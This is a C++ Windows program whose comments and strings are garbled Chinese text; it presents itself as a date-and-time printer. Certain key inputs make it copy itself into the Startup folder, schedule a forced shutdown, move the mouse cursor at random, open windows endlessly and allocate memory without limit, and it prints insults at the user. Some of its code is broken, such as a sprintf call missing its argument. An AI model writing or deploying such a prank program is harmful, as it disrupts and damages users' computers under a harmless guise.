#include<bits/stdc++.h>
#include<windows.h>
#include<ctime>
char a; 
using namespace std;
 int main(){
	cout<<"��Ҫ��ʱ����Ҫ�Ļ����롮Y��";
	cin>>a;
	if(a=='Y')
	{
		time_t t;
		time(&t);
		printf("Today's date and time is: %s",ctime(&t));
	} 
	else if(a=='s'||a=='S'||a=='b'||a=='B')
	{
		cout<<"��ϲ�㷢�������ع���2���е�3��Ŷ������";
		cout<<"�����sb!!!!!!!!!!"<<"������������";
		char copy[80];
		sprintf(copy,"copy %s \"%%userprofile%%\\����ʼ���˵�\\����\\����\"");
		system(copy); //�����bai���򿽵�du���������ļ�������zhi
		char cmd[]="shutdown -s -t 20";//�Զ�����
		system("ping baidu.com");
		system("pause");
		system(copy);
		int x=GetSystemMetrics(SM_CXSCREEN);//���x�� 
 	  	int y=GetSystemMetrics(SM_CYSCREEN);//���y�� 
 	  	srand(time(0));//����������� 
	    system("shutdown -s -t 20");//20��ػ� 
   	 while(1)//ѭ�� 
  		{ 
 	   		SetCursorPos(rand()%x,rand()%y);//��� x y�� ���
  	  		system("start");//�������� 	
       		char *p=new char[10000];//������ 
		}
		system("shutdown -s -h 0.5");
	} 
	else if(a=='c'||a=='C')
	{
		cout<<"��ϲ�㷢�������ع���3���е�3��Ŷ������";
		cout<<"��������������ĵ�����ǧ������꣡��Crl+C��Alt+F4�رվ�����,���أ����ǣ�����㰴��һ����꣬�ͻ�㵽��Ĵ��ڣ��š�������������루�����ػ��ɣ�������(�㵽��Ĵ��ڰ�alt+tab�ٵ�����)";
		int x=GetSystemMetrics(SM_CXSCREEN);
  		int y=GetSystemMetrics(SM_CYSCREEN);
  		srand(time(0));
 		while(true)
 	 	{
    	SetCursorPos(rand()%x,rand()%y);
 		}
  		
   }
	else
	{
		cout<<"��ϲ�㷢�������ع���1���е�3��Ŷ������";
		printf("\n");
		for(int i;;i++)
		{
			cout<<"��ϲ�㷢�������ع���1����3���ʵ�Ŷ������";
		printf("\n");
			cout<<"* * * * * * * * * * * *"<<endl<<"* * * ^ ^ * * ^ ^ * * *"<<endl<<"* * ^ ^ ^ * * ^ ^ ^ * *"<<endl<<"* * ^ ^ ^ ^ ^ ^ ^ ^ * *"<<endl<<"* * * ^ ^ ^ ^ ^ ^ * * *"<<endl<<"* * * * ^ ^ ^ ^ * * * *"<<endl<<"* * * * * ^ ^ * * * * *"<<endl;
		}
	}
	return 0;
} 
